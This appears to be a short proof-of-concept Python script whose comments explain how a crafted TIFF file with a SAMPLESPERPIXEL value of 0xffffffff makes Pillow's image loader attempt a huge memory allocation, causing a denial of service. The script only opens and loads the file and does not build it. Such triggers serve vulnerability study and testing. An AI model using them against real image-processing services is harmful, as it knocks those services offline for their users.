# Import the Pillow library
from PIL import Image

# Open a malicious TIFF image file
# This file has a SAMPLESPERPIXEL value of 0xffffffff
# This means that each pixel has 4294967295 samples
# This is much larger than the normal value of 1, 3, or 4
# The file size is only 8 KB, but the decoded image size is over 16 TB
img = Image.open("malicious.tiff")

# Try to load the image data
# This will trigger the vulnerability in the TiffImagePlugin.py module
# The load function will try to allocate a huge buffer in memory
# This will result in a memory allocation error and a denial of service
img.load()